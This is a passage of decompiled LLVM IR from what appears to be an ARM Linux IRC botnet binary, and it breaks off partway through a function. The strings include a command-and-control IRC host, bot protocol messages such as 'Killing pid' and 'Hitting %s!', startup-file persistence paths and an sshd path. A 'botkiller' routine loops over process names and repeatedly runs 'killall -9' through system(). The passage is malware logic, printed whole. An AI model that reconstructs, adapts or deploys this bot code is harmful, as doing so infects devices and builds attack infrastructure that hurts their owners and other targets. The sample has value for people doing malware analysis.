getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19f2c.164, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19f34.165, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_19f40.166, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19f50.167, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19f58.168, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19f60.169, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19f6c.170, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_19f78.171, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_19f84.172, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_19f94.173, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19fa4.174, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_19fb4.175, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19fc4.176, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19fd0.177, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19fdc.178, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_19fec.179, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19ffc.180, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1a00c.181, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1a01c.182, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1a028.183, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1a038.184, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1a04c.185, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1a058.186, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1a064.187, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1a074.188, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a084.189, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19a74.50, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a090.190, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a09c.191, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a0a4.192, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a0ac.193, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a0b4.194, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a0bc.195, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a0c4.196, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a0cc.197, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a0d4.198, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a0dc.199, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a0e4.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a0ec.201, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a0f4.202, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a0fc.203, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a104.204, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a10c.205, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a114.206, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a11c.207, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a124.208, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a12c.209, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a134.210, i32 0, i32 0), i8* bitcast (i32* @global_var_1a13c.211 to i8*), i8* bitcast (i32* @global_var_1a140.212 to i8*), i8* bitcast (i32* @global_var_1a144.213 to i8*), i8* bitcast (i32* @global_var_1a148.214 to i8*), i8* bitcast (i32* @global_var_1a14c.215 to i8*), i8* bitcast (i32* @global_var_1a150.216 to i8*), i8* bitcast (i32* @global_var_1a154.217 to i8*), i8* bitcast (i32* @global_var_1a158.218 to i8*), i8* bitcast (i32* @global_var_1a15c.219 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a160.220, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a164.221, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a168.222, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a16c.223, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a170.224, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a174.225, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a178.226, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a17c.227, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a180.228, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a184.229, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a188.230, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a18c.231, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1a190.232, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a19c.233, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a1a4.234, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a1ac.235, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a1b4.236, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a1b8.237, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a1bc.238, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a1c0.239, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a1c4.240, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a1c8.241, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a1cc.242, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a1d0.243, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1a1d4.244, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a1d8.245, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a1dc.246, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a1e0.247, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a1e4.248, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a1e8.249, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a1ec.250, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a1f0.251, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a1f4.252, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a1f8.253, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a1fc.254, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a208.255, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a210.256, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a218.257, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a220.258, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a228.259, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a230.260, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a238.261, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a240.262, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a248.263, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a254.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a25c.265, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a264.266, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1a270.267, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a278.268, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a280.269, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a288.270, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a290.271, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1a298.272, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a2a0.273, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1a2a8.274, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a2b4.275, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a2bc.276, i32 0, i32 0)]
@global_var_1a2d0.279 = constant [12 x i8] c"killall -9 \00"
@global_var_24b4c.283 = global i32 0
@global_var_24748.287 = local_unnamed_addr global i32 0
@global_var_27864.289 = global i32 0
@global_var_1a2fc.292 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_1a30c.294 = constant i32 114
@global_var_27840.298 = global i32 0
@global_var_1a310.300 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_1a32c.302 = constant [4 x i8] c"std\00"
@global_var_27860.305 = local_unnamed_addr global i32 0
@global_var_1a330.307 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_1a350.311 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_1a2f4.313 = constant [6 x i8] c"pices\00"
@global_var_1a370.314 = constant [4 x i8] c"STD\00"
@global_var_244ac.315 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1a2f4.313, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1a370.314, i32 0, i32 0)]
@global_var_27848.318 = global i32 0
@global_var_1a3b4.320 = constant i32 0
@global_var_244b0.322 = global [4 x i8]* @global_var_1a370.314
@global_var_1a3b8.325 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_2785c.328 = local_unnamed_addr global i32 0
@global_var_1a3c8.330 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1a3d8.332 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1a3e0.334 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_24744.337 = global i32 0
@global_var_1a3ec.345 = constant [16 x i8] c"[linux][armv7l]\00"
@global_var_2784c.347 = global i32 0
@global_var_24738.349 = global i32 0
@global_var_244a0.351 = local_unnamed_addr global i32 1
@global_var_1a2dc.353 = constant [22 x i8] c"irc.picesthegoatgg.ml\00"
@global_var_244a4.354 = global [22 x i8]* @global_var_1a2dc.353
@global_var_27854.356 = global i32 0
@global_var_1a41c.358 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_1a430.361 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1a440.363 = constant i32 47
@global_var_1a444.365 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1a44c.367 = constant i32 97
@global_var_1a450.369 = constant [14 x i8] c"/usr/bin/sshd\00"
@global_var_27850.374 = local_unnamed_addr global i32 0
@global_var_1a460.377 = constant i32 35
@global_var_1a464.380 = constant i32 0
@global_var_27844.382 = local_unnamed_addr global i32 0
@global_var_1a468.386 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_1a474.388 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_1a4a0.392 = constant i32 10
@global_var_1a4a4.394 = constant i32 42
@global_var_1a3fc.396 = constant [4 x i8] c"352\00"
@global_var_244d8.397 = global [4 x i8]* @global_var_1a3fc.396
@global_var_1a4a8.399 = constant [6 x i8] c"ERROR\00"
@global_var_24010.405 = global i32 0
@global_var_192c0.412 = constant i32 436207688
@global_var_10884.421 = constant i32 -382910288
@global_var_d040.422 = constant i32 -382906384
@global_var_f0a8.425 = constant i32 -382909968
@global_var_18840.443 = constant i32 436207625
@global_var_ba00.454 = constant i32 -382910448
@global_var_12d34.455 = constant i32 -382909968
@global_var_12e10.456 = constant i32 -382910224
@global_var_d62c.497 = constant i32 -456978431
@global_var_166c8.504 = constant i32 -442695584
@global_var_2402c.512 = local_unnamed_addr global i32 12
@global_var_1642c.518 = constant i32 -442695572
@global_var_15eb0.545 = constant i32 295698440
@global_var_e1a8.550 = constant i32 -478871519
@global_var_eb0c.560 = constant i32 -478805983
@global_var_1554c.562 = constant i32 167772170
@global_var_eef4.571 = constant i32 -382906384
@global_var_1202c.581 = constant i32 -442544040
@global_var_f4b4.587 = constant i32 -442564540
@global_var_1048c.645 = constant i32 82280
@global_var_feb0.646 = constant i32 -369098502
@global_var_ffff.655 = constant i32 59114
@global_var_10d0c.681 = constant i32 -494075872
@global_var_12358.682 = constant i32 -382910336
@global_var_27c38.685 = local_unnamed_addr global i32 0
@global_var_f324.697 = constant i32 -442543860
@global_var_d5a0.705 = constant i32 -369092166
@global_var_12768.735 = constant i32 72052
@global_var_11fe8.761 = constant i32 73912
@global_var_124b4.783 = constant i32 -443088884
@global_var_119d0.791 = constant i32 311230504
@global_var_150f8.862 = constant i32 -382910352
@global_var_10d90.892 = constant i32 -450904024
@global_var_16ca4.909 = constant i32 -382910224
@global_var_d264.933 = constant i32 -514654200
@global_var_16e0c.934 = constant i32 167772324
@global_var_ce20.941 = constant i32 436207704
@global_var_17ca4.953 = constant i32 -504313148
@global_var_17c8c.954 = constant i32 -483131392
@global_var_17b38.955 = constant i32 -481229311
@global_var_17d14.956 = constant i32 -477817729
@global_var_17e14.957 = constant i32 -476034303
@global_var_18050.958 = constant i32 -516685812
@global_var_17f44.959 = constant i32 -905969571
@global_var_17e78.960 = constant i32 -528203771
@global_var_180d8.961 = constant i32 -478079873
@global_var_180bc.962 = constant i32 -534704125
@global_var_1806c.963 = constant i32 -534704125
@global_var_18004.964 = constant i32 -483131392
@global_var_18940.972 = constant i32 -481296376
@global_var_18a38.973 = constant i32 -481296376
@global_var_18abc.974 = constant i32 -369098732
@global_var_2471c.13 = external global i8*
@global_var_2474c.281 = external global i8*
@global_var_2473c.285 = external local_unnamed_addr global i8*
@global_var_24740.339 = external local_unnamed_addr global i8*
@global_var_24743.340 = external local_unnamed_addr global i8*
@global_var_24742.341 = external local_unnamed_addr global i8*
@global_var_24741.342 = external local_unnamed_addr global i8*
@global_var_24070.401 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @_call_via_r0(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %arg1
}

define i32 @_call_via_r1(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80f4 = load i32, i32* @r0, align 4
  ret i32 %v1_80f4
}

define i32 @_call_via_r2(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80f8 = load i32, i32* @r0, align 4
  ret i32 %v1_80f8
}

define i32 @_call_via_r3(i32 %arg1) local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 %arg1)
  %v1_80fc = load i32, i32* @r0, align 4
  ret i32 %v1_80fc
}

define i32 @_call_via_r4() local_unnamed_addr {
entry:
  %v0_8100 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v0_8100)
  %v1_8100 = load i32, i32* @r0, align 4
  ret i32 %v1_8100
}

define i32 @_call_via_r5() local_unnamed_addr {
entry:
  %v0_8104 = load i32, i32* @r5, align 4
  call void @__pseudo_branch(i32 %v0_8104)
  %v1_8104 = load i32, i32* @r0, align 4
  ret i32 %v1_8104
}

define i32 @_call_via_r6() local_unnamed_addr {
entry:
  %v0_8108 = load i32, i32* @r6, align 4
  call void @__pseudo_branch(i32 %v0_8108)
  %v1_8108 = load i32, i32* @r0, align 4
  ret i32 %v1_8108
}

define i32 @_call_via_r7() local_unnamed_addr {
entry:
  %v0_810c = load i32, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v0_810c)
  %v1_810c = load i32, i32* @r0, align 4
  ret i32 %v1_810c
}

define i32 @_call_via_r8() local_unnamed_addr {
entry:
  %v0_8110 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %v0_8110)
  %v1_8110 = load i32, i32* @r0, align 4
  ret i32 %v1_8110
}

define i32 @_call_via_r9() local_unnamed_addr {
entry:
  %v0_8114 = load i32, i32* @sb, align 4
  call void @__pseudo_branch(i32 %v0_8114)
  %v1_8114 = load i32, i32* @r0, align 4
  ret i32 %v1_8114
}

define i32 @_call_via_sl() local_unnamed_addr {
entry:
  %v0_8118 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %v0_8118)
  %v1_8118 = load i32, i32* @r0, align 4
  ret i32 %v1_8118
}

define i32 @_call_via_fp() local_unnamed_addr {
entry:
  %v0_811c = load i32, i32* @fp, align 4
  call void @__pseudo_branch(i32 %v0_811c)
  %v1_811c = load i32, i32* @r0, align 4
  ret i32 %v1_811c
}

define i32 @_call_via_ip() local_unnamed_addr {
entry:
  %v0_8120 = load i32, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v0_8120)
  %v1_8120 = load i32, i32* @r0, align 4
  ret i32 %v1_8120
}

define i32 @_call_via_sp() local_unnamed_addr {
entry:
  %v0_8124 = load i32, i32* @sp, align 4
  call void @__pseudo_branch(i32 %v0_8124)
  %v1_8124 = load i32, i32* @r0, align 4
  ret i32 %v1_8124
}

define i32 @_call_via_lr() local_unnamed_addr {
entry:
  %v1_8128 = load i32, i32* @r0, align 4
  ret i32 %v1_8128
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_812c = load i32, i32* @r4, align 4
  store i32 %v3_812c, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_2471c.13 to i32), i32* %r4.global-to-local, align 4
  %v2_8134 = load i8, i8* bitcast (i8** @global_var_2471c.13 to i8*), align 4
  %v2_8138 = icmp eq i8 %v2_8134, 0
  br i1 %v2_8138, label %dec_label_pc_8140, label %dec_label_pc_815c

dec_label_pc_8140:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* %r4.global-to-local, align 4
  %v3_8158 = inttoptr i32 %v2_8158 to i8*
  store i8 1, i8* %v3_8158, align 1
  %v2_815c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_815c

dec_label_pc_815c:                                ; preds = %entry, %dec_label_pc_8140
  %v2_815c = phi i32 [ %v3_812c, %entry ], [ %v2_815c.pre, %dec_label_pc_8140 ]
  store i32 %v2_815c, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_2471c.13, { 1, 0 }
  uselistorder label %dec_label_pc_815c, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8194 = load i32, i32* @global_var_2400c.23, align 4
  %v2_8198 = icmp eq i32 %v2_8194, 0
  br i1 %v2_8198, label %dec_label_pc_81b0, label %dec_label_pc_81a0

dec_label_pc_81a0:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_81b0

dec_label_pc_81b0:                                ; preds = %bb, %dec_label_pc_81a0
  ret i32 ptrtoint (i32* @global_var_2400c.23 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2400c.23, { 1, 0 }
  uselistorder label %dec_label_pc_81b0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_81d8 = ptrtoint i32* %stack_var_4 to i32
  %v8_81f8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_9f98.27 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 104916, i32 %arg1, i32 %v4_81d8)
  %v0_81fc = call i32 @abort()
  ret i32 %v0_81fc
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_820c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_820c, i32* @ip, align 4
  %v2_8228 = ptrtoint i32* %stack_var_-100 to i32
  %v2_8254 = bitcast i32* %stack_var_-100 to i8*
  br label %dec_label_pc_821c

dec_label_pc_821c:                                ; preds = %dec_label_pc_82b8, %entry
  br label %dec_label_pc_8228

dec_label_pc_8228:                                ; preds = %dec_label_pc_821c, %dec_label_pc_8228
  %storemerge12 = phi i32 [ 0, %dec_label_pc_821c ], [ %v1_82a4, %dec_label_pc_8228 ]
  store i32 %v2_8228, i32* @r3, align 4
  store i32 %v2_8228, i32* @r0, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_1a2c4.30 to i32), i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_8238 = call i32 @memcpy()
  %v4_8244 = mul nuw nsw i32 %storemerge12, 4
  %v5_8244 = add i32 %v4_8244, ptrtoint ([246 x i8*]* @global_var_240c8.277 to i32)
  %v6_8244 = inttoptr i32 %v5_8244 to i32*
  %v7_8244 = load i32, i32* %v6_8244, align 4
  store i32 %v7_8244, i32* @r1, align 4
  %v3_8254 = call i32 @strcat(i8* %v2_8254, i32 %v7_8244)
  %v1_8260 = call i32 @__libc_system(i32 %v2_8228)
  store i32 %v2_8228, i32* @r3, align 4
  store i32 %v2_8228, i32* @r0, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1a2d0.279 to i32), i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_8274 = call i32 @memcpy()
  %v7_8280 = load i32, i32* %v6_8244, align 4
  store i32 %v7_8280, i32* @r1, align 4
  %v3_8290 = call i32 @strcat(i8* %v2_8254, i32 %v7_8280)
  %v1_829c = call i32 @__libc_system(i32 %v2_8228)
  %v1_82a4 = add nuw nsw i32 %storemerge12, 1
  %v7_82b4 = icmp slt i32 %v1_82a4, 9
  br i1 %v7_82b4, label %dec_label_pc_8228, label %dec_label_pc_82b8

dec_label_pc_82b8:                                ; preds = %dec_label_pc_8228
  %v1_82bc = call i32 @sleep(i32 5)
  br label %dec_label_pc_821c

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 (i32)* @__libc_system, { 1, 0 }
  uselistorder label %dec_label_pc_8228, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_82d4 = load i32, i32* @r4, align 4
  %v6_82d4 = load i32, i32* @fp, align 4
  store i32 33500, i32* %stack_var_-4, align 4
  %v2_82d8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_82d8, i32* @fp, align 4
  %v2_82ec = load i8, i8* %arg1, align 1
  %v7_82f8 = icmp eq i8 %v2_82ec, 42
  br i1 %v7_82f8, label %dec_label_pc_832c, label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %entry
  %v7_8304 = icmp eq i8 %v2_82ec, 63
  br i1 %v7_8304, label %dec_label_pc_839c, label %dec_label_pc_830c

dec_label_pc_830c:                                ; preds = %dec_label_pc_8300
  %v2_8310 = icmp eq i8 %v2_82ec, 0
  br i1 %v2_8310, label %dec_label_pc_831c, label %dec_label_pc_83f4

dec_label_pc_831c:                                ; preds = %dec_label_pc_830c
  %v2_8320 = load i8, i8* %tmp, align 1
  %v3_8320 = zext i8 %v2_8320 to i32
  br label %dec_label_pc_8468

dec_label_pc_832c:                                ; preds = %entry
  %v1_8330 = add i32 %tmp9, 1
  %v3_833c = inttoptr i32 %v1_8330 to i8*
  %v4_833c = call i32 @strwildmatch(i8* %v3_833c, i32 %arg2)
  %v2_8344 = icmp eq i32 %v4_833c, 0
  br i1 %v2_8344, label %dec_label_pc_8388, label %dec_label_pc_834c

dec_label_pc_834c:                                ; preds = %dec_label_pc_832c
  %v2_8350 = load i8, i8* %tmp, align 1
  %v2_8354 = icmp eq i8 %v2_8350, 0
  br i1 %v2_8354, label %dec_label_pc_8390, label %dec_label_pc_835c

dec_label_pc_835c:                                ; preds = %dec_label_pc_834c
  %v1_8360 = add i32 %arg2, 1
  %v4_836c = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8360)
  %v2_8374 = icmp eq i32 %v4_836c, 0
  br i1 %v2_8374, label %dec_label_pc_8388, label %dec_label_pc_8390

dec_label_pc_8388:                                ; preds = %dec_label_pc_835c, %dec_label_pc_832c
  br label %dec_label_pc_8390

dec_label_pc_8390:                                ; preds = %dec_label_pc_834c, %dec_label_pc_835c, %dec_label_pc_8388
  %storemerge4 = phi i32 [ 0, %dec_label_pc_8388 ], [ 1, %dec_label_pc_835c ], [ 1, %dec_label_pc_834c ]
  br label %dec_label_pc_8468

dec_label_pc_839c:                                ; preds = %dec_label_pc_8300
  %v2_83a0 = load i8, i8* %tmp, align 1
  %v2_83a4 = icmp eq i8 %v2_83a0, 0
  br i1 %v2_83a4, label %dec_label_pc_83e8, label %dec_label_pc_83ac

dec_label_pc_83ac:                                ; preds = %dec_label_pc_839c
  %v1_83b0 = add i32 %tmp9, 1
  %v1_83b8 = add i32 %arg2, 1
  %v2_83c4 = inttoptr i32 %v1_83b0 to i8*
  %v3_83c4 = call i32 @strwildmatch(i8* %v2_83c4, i32 %v1_83b8)
  %v2_83cc = icmp ne i32 %v3_83c4, 0
  %. = zext i1 %v2_83cc to i32
  br label %dec_label_pc_83e8

dec_label_pc_83e8:                                ; preds = %dec_label_pc_83ac, %dec_label_pc_839c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_839c ], [ %., %dec_label_pc_83ac ]
  br label %dec_label_pc_8468

dec_label_pc_83f4:                                ; preds = %dec_label_pc_830c
  %v2_83f8 = load i8, i8* %arg1, align 1
  %v3_83f8 = zext i8 %v2_83f8 to i32
  %v1_8400 = call i32 @__GI_toupper(i32 %v3_83f8)
  store i32 %v1_8400, i32* @r4, align 4
  %v2_840c = load i8, i8* %tmp, align 1
  %v3_840c = zext i8 %v2_840c to i32
  %v1_8414 = call i32 @__GI_toupper(i32 %v3_840c)
  %v0_841c = load i32, i32* @r4, align 4
  %v9_841c = icmp eq i32 %v0_841c, %v1_8414
  br i1 %v9_841c, label %dec_label_pc_8424, label %dec_label_pc_8460

dec_label_pc_8424:                                ; preds = %dec_label_pc_83f4
  %v1_8428 = add i32 %tmp9, 1
  %v1_8430 = add i32 %arg2, 1
  %v2_843c = inttoptr i32 %v1_8428 to i8*
  %v3_843c = call i32 @strwildmatch(i8* %v2_843c, i32 %v1_8430)
  %v2_8444 = icmp ne i32 %v3_843c, 0
  %.8 = zext i1 %v2_8444 to i32
  br label %dec_label_pc_8460

dec_label_pc_8460:                                ; preds = %dec_label_pc_8424, %dec_label_pc_83f4
  %storemerge = phi i32 [ 1, %dec_label_pc_83f4 ], [ %.8, %dec_label_pc_8424 ]
  br label %dec_label_pc_8468

